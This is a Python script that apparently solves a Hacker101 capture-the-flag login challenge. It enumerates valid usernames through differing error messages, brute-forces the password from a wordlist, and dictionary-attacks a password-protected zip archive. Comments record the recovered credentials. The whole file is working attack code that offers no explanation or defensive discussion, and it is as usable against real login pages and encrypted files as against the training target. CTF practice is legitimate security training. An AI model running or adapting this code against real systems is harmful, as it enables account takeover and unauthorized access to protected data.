import requests
import itertools

url = "https://1195c61969e46a0503d1fbae1c5e8b56.ctf.hacker101.com/secure-login/"
wordlist_path = "multiplesources-users-fabian-fingerle.de.txt"

# Use a session for speed
session = requests.Session()

def findUsername():
    print(f"--- Hunting for valid usernames ---")

    with open(wordlist_path, 'r', errors='ignore') as f:
        for count, line in enumerate(f, 1):
            username = line.strip()
            if not username: continue
            
            if count % 500 == 0:
                print(f"[*] Checked {count} names...")

            data = {"username": username, "password": "any_fake_password"}
            
            try:
                r = session.post(url, data=data, timeout=5)
                
                # Check for if "Invalid Username is not in the text"
                if "Invalid Username" not in r.text:
                    print(f"\nPossible valid username found: {username}")
                    
                    # Check what the new message is
                    if "Invalid Password" in r.text:
                        print("Status: Username exists, but password was wrong.")
                    else:
                        print("Status: Unexpected response! Check the page manually.")
                    
                    # Stop once we find the first valid user
                    break 
                    
            except Exception as e:
                print(f"Error on {username}: {e}")
                break

def findPassword(start_from=1):
    print(f"--- Hunting for valid passwords ---")

    with open(wordlist_path, 'r', errors='ignore') as f:
        # Skip directly to the (start_from)th line; enumerate counts from start_from
        for count, line in enumerate(itertools.islice(f, start_from - 1, None), start_from):
            password = line.strip()
            if not password:
                continue
            
            if count % 500 == 0:
                print(f"[*] Checked {count} passwords...")
            
            data = {"username": "access", "password": password}

            try:
                r = session.post(url, data=data, timeout=5)

                if "Invalid Password" not in r.text:
                    print(f"\nPossible valid password found: {password}")
                    # Stop once we find the first valid user
                    break 
                    
            except Exception as e: 
                print(f"Error on {password}: {e}")
                break

def crackZipFile():
    import zipfile
    import zlib

    zip_file = "my_secure_files_not_for_you.zip"
    wordlist = "multiplesources-users-fabian-fingerle.de.txt"

    with zipfile.ZipFile(zip_file) as zf:
        # Test against the first file in the archive to avoid extracting everything
        test_file = zf.namelist()[0]
        with open(wordlist, 'rb') as f:
            for count, line in enumerate(f):
                password = line.strip()
                if count % 1000 == 0:
                    print(f"[*] Checked {count} passwords...")
                try:
                    zf.read(test_file, pwd=password)
                    print(f"PASSWORD FOUND: {password.decode(errors='ignore')}")
                    break
                except (RuntimeError, zipfile.BadZipFile, zlib.error):
                    continue



#findUsername() # username found to be access
#findPassword(start_from=5501) # password found to be computer
crackZipFile()
